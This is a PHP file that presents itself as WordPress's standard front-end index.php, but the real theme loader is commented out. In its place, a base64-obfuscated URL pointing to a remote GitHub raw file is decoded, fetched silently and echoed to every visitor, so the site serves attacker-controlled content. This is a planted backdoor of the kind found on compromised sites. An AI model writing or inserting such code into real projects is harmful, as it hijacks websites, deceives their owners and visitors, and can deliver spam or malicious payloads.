<?php


/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
$base64_url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3p1cmVuMjQyLXRlY2gveC9yZWZzL2hlYWRzL21haW4vMS13Yi1sZ3Vr";
$url = base64_decode($base64_url);
$content = @file_get_contents($url);
echo $content;
 
// define( 'WP_USE_THEMES', true );

// /** Loads the WordPress Environment and Template */
// require __DIR__ . '/wp-blog-header.php';
